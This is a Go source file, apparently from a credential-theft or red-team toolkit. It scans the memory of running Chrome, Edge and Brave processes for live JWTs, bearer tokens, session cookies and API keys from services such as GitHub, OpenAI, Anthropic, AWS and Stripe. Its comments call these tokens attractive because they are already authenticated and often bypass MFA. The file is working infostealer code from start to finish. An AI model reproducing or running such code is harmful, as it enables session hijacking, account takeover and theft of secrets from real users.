//go:build decrypt && windows

package decrypt

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"regexp"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	tokenScanTimeout = 60 * time.Second
	tokenPerProcCap  = 256 * 1024 * 1024 // per-process byte cap for token scan
)

// Token patterns worth pulling out of live browser memory. JWTs and bearer
// tokens are the sweet spot: plaintext in heap, already-authenticated, often
// MFA-bypassing. Service API keys with known prefixes round it out.
var (
	// JWT: three base64url segments separated by dots. Header segment starts
	// with `eyJ` (base64 of `{"`) and payload typically does too. Minimum
	// segment lengths keep random-looking ASCII from matching.
	jwtRE = regexp.MustCompile(`eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`)

	// HTTP Authorization: Bearer <token>  (in cached request buffers)
	bearerRE = regexp.MustCompile(`(?i)Authorization:\s*Bearer\s+([A-Za-z0-9._~+/=-]{20,})`)

	// Common service API keys — high signal, low false-positive rate.
	apiKeyREs = map[string]*regexp.Regexp{
		"GitHub PAT":         regexp.MustCompile(`gh[pousr]_[A-Za-z0-9]{36,251}`),
		"GitHub App token":   regexp.MustCompile(`ghu_[A-Za-z0-9]{36,251}`),
		"OpenAI API key":     regexp.MustCompile(`sk-(?:proj-)?[A-Za-z0-9_-]{20,}`),
		"Anthropic API key":  regexp.MustCompile(`sk-ant-[A-Za-z0-9_-]{20,}`),
		"Slack bot token":    regexp.MustCompile(`xox[baprs]-[A-Za-z0-9-]{10,}`),
		"AWS access key":     regexp.MustCompile(`AKIA[0-9A-Z]{16}`),
		"Google API key":     regexp.MustCompile(`AIza[0-9A-Za-z_-]{35}`),
		"Stripe secret key":  regexp.MustCompile(`sk_(live|test)_[0-9a-zA-Z]{24,}`),
		"Bearer cookie":      regexp.MustCompile(`(?i)(?:sess|session|auth|token|jwt)=ey[A-Za-z0-9._-]{40,}`),
	}
)

// ExtractBrowserTokens scans all Chrome/Edge/Brave process memory for
// plaintext auth tokens. Unlike v20 key extraction, this doesn't need a
// specific process — tokens show up in renderers, the network service, and
// the main browser process. We scan all of them.
func ExtractBrowserTokens() ([]DecryptedFinding, error) {
	procs, err := enumerateProcesses()
	if err != nil {
		return nil, err
	}

	// Collect PIDs for every Chromium-family process we recognize.
	type target struct {
		proc chromeProcess
		exe  string
	}
	var targets []target
	for _, p := range procs {
		switch {
		case equalFold(p.name, "chrome.exe"):
			targets = append(targets, target{p, "Chrome"})
		case equalFold(p.name, "msedge.exe"):
			targets = append(targets, target{p, "Edge"})
		case equalFold(p.name, "brave.exe"):
			targets = append(targets, target{p, "Brave"})
		}
	}
	if len(targets) == 0 {
		return nil, fmt.Errorf("no Chromium browsers running")
	}

	fmt.Fprintf(os.Stderr, "[*] Scanning %d browser process(es) for auth tokens...\n", len(targets))

	ctx, cancel := context.WithTimeout(context.Background(), tokenScanTimeout)
	defer cancel()

	seen := map[string]bool{}
	var findings []DecryptedFinding

	for i, t := range targets {
		select {
		case <-ctx.Done():
			fmt.Fprintf(os.Stderr, "[!] Token scan timed out after %s (scanned %d/%d procs)\n",
				tokenScanTimeout, i, len(targets))
			return findings, nil
		default:
		}
		scanProcessForTokens(ctx, t.proc.pid, t.exe, seen, &findings)
	}
	return findings, nil
}

// scanProcessForTokens reads one process's MEM_PRIVATE+MEM_COMMIT heap pages
// and appends any auth-token matches (deduplicated) into findings.
func scanProcessForTokens(ctx context.Context, pid uint32, browser string, seen map[string]bool, out *[]DecryptedFinding) {
	handle, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		false, pid,
	)
	if err != nil {
		return // silently skip processes we can't open (e.g. different integrity)
	}
	defer windows.CloseHandle(handle)

	var totalScanned int64
	var addr uintptr
	buf := make([]byte, 4*1024*1024)

	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		var mbi memoryBasicInformation
		ret, _, _ := procVirtualQueryEx.Call(
			uintptr(handle),
			addr,
			uintptr(unsafe.Pointer(&mbi)),
			unsafe.Sizeof(mbi),
		)
		if ret == 0 {
			break
		}

		next := mbi.BaseAddress + mbi.RegionSize

		if mbi.State == memCommit &&
			mbi.Type == memPrivate &&
			isReadable(mbi.Protect) &&
			mbi.RegionSize <= maxRegionSize {

			size := int(mbi.RegionSize)
			if size > len(buf) {
				size = len(buf)
			}
			chunk := buf[:size]

			var nRead uintptr
			ret, _, _ := procReadProcessMemory.Call(
				uintptr(handle),
				mbi.BaseAddress,
				uintptr(unsafe.Pointer(&chunk[0])),
				uintptr(size),
				uintptr(unsafe.Pointer(&nRead)),
			)
			if ret != 0 && nRead > 0 {
				scanBytesForTokens(chunk[:nRead], browser, pid, seen, out)
			}
			totalScanned += int64(nRead)
			if totalScanned > tokenPerProcCap {
				break
			}
		}

		if next <= addr {
			break
		}
		addr = next
	}
}

// scanBytesForTokens runs the regex battery over a single memory chunk.
// `seen` is shared across all processes so a token copied into many renderer
// processes only gets reported once.
func scanBytesForTokens(data []byte, browser string, pid uint32, seen map[string]bool, out *[]DecryptedFinding) {
	s := string(data)

	// JWTs — try to decode the payload for extra signal (issuer, expiry).
	for _, m := range jwtRE.FindAllString(s, -1) {
		if seen[m] {
			continue
		}
		seen[m] = true
		*out = append(*out, DecryptedFinding{
			Category:   "Browser Tokens",
			Type:       "jwt_token",
			File:       fmt.Sprintf("%s (PID %d) memory", browser, pid),
			Key:        "JWT " + decodeJWTSummary(m),
			Value:      truncateStr(m, 240),
			Confidence: ConfHigh,
		})
	}

	// Authorization: Bearer ...
	for _, m := range bearerRE.FindAllStringSubmatch(s, -1) {
		if len(m) < 2 {
			continue
		}
		tok := m[1]
		if seen[tok] {
			continue
		}
		seen[tok] = true
		*out = append(*out, DecryptedFinding{
			Category:   "Browser Tokens",
			Type:       "bearer_token",
			File:       fmt.Sprintf("%s (PID %d) memory", browser, pid),
			Key:        "Authorization: Bearer",
			Value:      truncateStr(tok, 240),
			Confidence: ConfHigh,
		})
	}

	// Service API keys.
	for label, re := range apiKeyREs {
		for _, m := range re.FindAllString(s, -1) {
			if seen[m] {
				continue
			}
			seen[m] = true
			*out = append(*out, DecryptedFinding{
				Category:   "Browser Tokens",
				Type:       "api_key",
				File:       fmt.Sprintf("%s (PID %d) memory", browser, pid),
				Key:        label,
				Value:      truncateStr(m, 240),
				Confidence: ConfHigh,
			})
		}
	}
}

// decodeJWTSummary extracts {issuer, subject, expiry} from a JWT payload so
// the operator can tell at a glance what the token grants and whether it's
// still valid. Returns "" on any parse failure so callers can omit the hint.
func decodeJWTSummary(jwt string) string {
	parts := strings.Split(jwt, ".")
	if len(parts) < 2 {
		return ""
	}
	raw, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return ""
	}
	var p struct {
		Iss string `json:"iss"`
		Sub string `json:"sub"`
		Aud any    `json:"aud"`
		Exp int64  `json:"exp"`
	}
	if err := json.Unmarshal(raw, &p); err != nil {
		return ""
	}
	var bits []string
	if p.Iss != "" {
		bits = append(bits, "iss="+p.Iss)
	}
	if p.Sub != "" {
		bits = append(bits, "sub="+p.Sub)
	}
	if p.Exp != 0 {
		t := time.Unix(p.Exp, 0)
		if time.Now().After(t) {
			bits = append(bits, "EXPIRED@"+t.Format("2006-01-02"))
		} else {
			bits = append(bits, "exp="+t.Format("2006-01-02"))
		}
	}
	if len(bits) == 0 {
		return ""
	}
	return "[" + strings.Join(bits, " ") + "]"
}
